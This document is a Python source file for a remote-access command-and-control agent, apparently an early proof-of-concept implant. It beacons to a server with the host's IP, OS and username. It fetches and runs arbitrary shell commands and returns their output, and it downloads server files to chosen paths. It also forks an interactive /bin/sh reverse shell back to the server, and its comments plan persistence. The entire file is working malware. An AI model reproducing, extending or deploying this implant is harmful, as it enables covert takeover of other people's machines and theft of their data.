import requests 
import time
import socket
import json 
import platform
import subprocess
import random
import getpass  
import os 
from sys import exit

"""
TODO: Create a builder script which creates this agent script 
with specific configurations.

TODO4: Create persistence on the script itself. 
"""

# TODO: This agent is turning into a mess, I need a proper agent class 
# with proper functions 

# Debugging information  
SERVERIP = 'localhost'
PORT = 5000 
"""
SERVERIP = '<SERVERIP>'
PORT = <PORT>
"""
URL = 'http://'+SERVERIP+':'+str(PORT)
FIRSTCONTACTKEY = 'firstcontactkey'

def reverse_shell(port):
    try:
        # Stop hardcoding the serverip 
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((SERVERIP,port))
    except Exception as e:
        exit()

    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/sh","-i"]);

    os._exit(0)

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except:
        IP = '127.0.0.1'
    finally:
        s.close()

        return IP 

def heartbeat(ip, user):
    url = URL + '/heartbeat'

    data = {'ip': ip, 'user': user}

    try:
        res = requests.post(url, data=data)
        return True
    except Exception as e:
        return False

def firstcontact():
    url = URL + '/firstcontact'

    data = {'firstcontactkey': FIRSTCONTACTKEY}

    try:
        res = requests.post(url, data=data)
    except Exception as e:
        return "[-]" + str(e)

    global REGISTERKEY
    json_data = json.loads(res.text)
    print(res.text)
    REGISTERKEY = json_data['registerkey']
    
    return json_data['registerkey']

def register(ip, os, user):
    url = URL + '/register'

    data = {'registerkey': REGISTERKEY, 'ip': ip, 'os': os, 'user': user}

    try:
        res = requests.post(url,data=data)
        data = res.json()

    except Exception as e:
        print("[DEBUG]", str(e))

    if 'error' in data:
        print("[DEBUG] Already registered, or some error have occurred.")
        exit()


    #return REGISTERKEY

def fetchCommand(ip):
    url = URL + '/bot/' + ip + '/task'
    data = {'registerkey': REGISTERKEY}

    try:
        res = requests.post(url, data=data)
        json_data = json.loads(res.text)
    
    # Unable to connect to the server 
    except Exception as e:
        return '[-] ' + str(e)

    #print("[*] json_data = ", json_data)

    # Command has not been staged. Return [-] and just sleep. 
    if 'command' not in json_data:
        return '[-] ' + str(json_data)

    else:
        command = json_data['command']
        #print("[+] Command received: ", command)
        # TODO: Add upload/download/shell related functionality of the agent here 
        if "download" == command.split(' ')[0]:
            try:
                # The destination path might be a problem if the path has space in between. ex) C:\Program Files\ ... 
                filename = command.split(' ')[1]
                destination_path = command.split(' ')[2]

                data = {'registerkey': REGISTERKEY}
                download_url = URL + '/download/' + filename
                myFile = requests.post(download_url, data=data)
                #print('[+]', myFile.content)

                open(destination_path,'wb').write(myFile.content)


            except Exception as e:
                return "[DEBUG] File Download Failed: " + str(e) 

            return '[+] Download successful. Filename: ' + filename + ' Destination: ' + destination_path 

        elif "shell" == command.split(' ')[0]:
            # Spawn an independent reverse shell through fork.
            # This fork will actually spawn a new agent.py 
            time.sleep(10)
            try:
                newpid = os.fork()
                if newpid==0:
                    port = int(command.split(' ')[1])
                    reverse_shell(port)

                return "[+] Reverse shell created"

            except Exception as e:
                print(str(e))
                return "[-] " + str(e)
            
        #elif "upload" == command.split(' ')[0]: 
        else:
            # TODO: If the subprocess.check_output spawns a process ex) a meterpreter shell, the agent will hang 
            try:
                #result = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True, timeout=5)
                process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                stdout,stderr = process.communicate()
                result = stdout 
            except Exception as e: 
                #payload = "[" + str(e.returncode) + "] " + str(e.output.decode('utf-8'))
                return "Status: FAILED " + str(e) 
        
        return result.decode('utf-8') 


def submit_result(ip, result):
    url = URL + '/bot/' + ip + '/result'
    
    data = {'registerkey': REGISTERKEY, 'result': result}

    requests.post(url, data=data)


def main(): 

    # Figure out platform 
    if "Linux" in platform.platform():
        host_os = 'Nix'
    elif "Windows" in platform.platform():
        host_os = 'Windows'
    else:
        print("[-] Unidentifiable OS type")

    attempt = 1

    ip = get_ip()
    user = getpass.getuser()
    if "[-]" in firstcontact():
        print("[DEBUG] Unable to make first contact.", str(firstcontact()))
        exit()
    register(ip,host_os,user)

    
    while(1):
        # Attempting for heartbeat 
        heartbeat_result = heartbeat(ip,user)

        if not heartbeat_result:
            print("[DEBUG] attempt: ", str(attempt))
            firstcontact()
            register(ip,host_os,user)
            attempt += 1 

        if attempt > 10: 
            print("[DEBUG] Server is dead for sure. Exiting.")
            exit(1)
        
        # Heartbeat is successful. Fetching commands... 
        if heartbeat_result is not False:
            try:
                result = fetchCommand(ip)
            except Exception as e:
                continue 

            # If server response that the bot doesn't have anything, just sleep.
            if isinstance(result, str) and '[-]' in result:
                print("[-] Sleeping...")
                time.sleep(10)
                continue

            #print("[DEBUG] Result:", result)
            submit_result(ip, result)

            print("[+] Command feteched and executed. Sleeping ... ")
            
        # This is for production. For PoC, just sleep for 10 seconds.
        #timerandom = random.randint(10,20)
        #time.sleep(timerandom)
        time.sleep(10)


if __name__ == '__main__':
    main()